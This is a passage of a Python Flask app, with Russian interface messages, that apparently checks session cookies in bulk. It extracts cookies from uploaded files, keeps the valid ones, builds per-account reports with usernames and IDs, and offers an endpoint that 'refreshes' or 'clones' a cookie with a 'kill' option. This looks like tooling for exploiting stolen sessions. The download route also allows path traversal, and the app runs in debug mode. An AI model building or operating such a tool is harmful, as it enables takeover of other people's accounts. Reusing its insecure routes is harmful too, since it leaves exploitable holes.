            "message": f"✅ Проверка завершена!\nВсего: {len(cookies)}\nВалидных: {len(valid)}\nНевалидных: {len(invalid)}",
            "download_url": f"/download/{filename}"
        })
    
    return jsonify({"success": True, "message": f"Валидных куков не найдено. Всего: {len(cookies)}"})

@app.route("/api/fullcheck", methods=["POST"])
def api_fullcheck():
    if 'file' not in request.files:
        return jsonify({"success": False, "message": "Файл не найден"})
    
    file = request.files['file']
    fmt = request.form.get('format', 'zip')
    content = file.read().decode('utf-8', errors='ignore')
    cookies = extract_cookies(content)
    
    if not cookies:
        return jsonify({"success": False, "message": "Куки не найдены"})
    
    reports_data = []
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    
    for c in cookies:
        info = get_full_info(c)
        if info['status'] == '✅':
            reports_data.append(info)

    if not reports_data:
        return jsonify({"success": False, "message": "Нет валидных аккаунтов"})

    if fmt == 'zip':
        zip_filename = f"kai_reports_{timestamp}.zip"
        zip_path = os.path.join("output", zip_filename)
        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zf:
            for idx, r in enumerate(reports_data):
                txt_content = generate_txt_report(r)
                username = r.get('Username', f'account_{idx+1}')
                safe_name = re.sub(r'[<>:"/\\|?*]', '_', username)
                zf.writestr(f"{safe_name}_{r.get('UserID', idx+1)}.txt", txt_content)
        output_path = zip_path
        output_filename = zip_filename
    elif fmt == 'html':
        output_filename = f"kai_report_{timestamp}.html"
        output_path = os.path.join("output", output_filename)
        html_content = "\n<hr>\n".join([generate_html_report(r) for r in reports_data])
        with open(output_path, 'w', encoding='utf-8') as f:
            f.write(html_content)
    elif fmt == 'csv':
        output_filename = f"kai_report_{timestamp}.csv"
        output_path = os.path.join("output", output_filename)
        csv_content = generate_csv_data(reports_data)
        with open(output_path, 'w', encoding='utf-8') as f:
            f.write(csv_content)
    else:
        # По умолчанию ZIP
        zip_filename = f"kai_reports_{timestamp}.zip"
        zip_path = os.path.join("output", zip_filename)
        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zf:
            for idx, r in enumerate(reports_data):
                txt_content = generate_txt_report(r)
                username = r.get('Username', f'account_{idx+1}')
                safe_name = re.sub(r'[<>:"/\\|?*]', '_', username)
                zf.writestr(f"{safe_name}_{r.get('UserID', idx+1)}.txt", txt_content)
        output_path = zip_path
        output_filename = zip_filename

    save_history("FULLCHECK", f"Проверено: {len(reports_data)} | Формат: {fmt}")
    return jsonify({
        "success": True,
        "total": len(reports_data),
        "download_url": f"/download/{os.path.basename(output_path)}"
    })

@app.route("/download/<filename>")
def download_file(filename):
    return send_file(os.path.join("output", filename), as_attachment=True)

@app.route("/api/refresh", methods=["POST"])
def api_refresh():
    data = request.json or {}
    cookie = data.get("cookie", "").strip()
    kill = data.get("kill", True)
    if not cookie:
        return jsonify({"success": False, "message": "Кук не передан"})
    
    success, new_cookie, log = refresh_cookie_sync(cookie, kill)
    if success:
        save_history("FRESHER" if kill else "DUPLICATOR", "Успешно обновлен/клонирован кук")
        return jsonify({"success": True, "new_cookie": new_cookie, "log": log})
    else:
        return jsonify({"success": False, "message": log})

@app.route("/api/history", methods=["GET"])
def api_history():
    if os.path.exists(HISTORY_FILE):
        try:
            with open(HISTORY_FILE, 'r', encoding='utf-8') as f:
                return jsonify(json.load(f))
        except Exception:
            return jsonify([])
    return jsonify([])

@app.route("/api/clear-output", methods=["POST"])
def api_clear_output():
    try:
        count = 0
        for f in os.listdir("output"):
            fp = os.path.join("output", f)
            if os.path.isfile(fp):
                os.remove(fp)
                count += 1
        return jsonify({"success": True, "message": f"✅ Удалено файлов: {count}"})
    except Exception as e:
        return jsonify({"success": False, "message": f"Ошибка: {str(e)}"})

if __name__ == "__main__":
    app.run(debug=True, port=5000)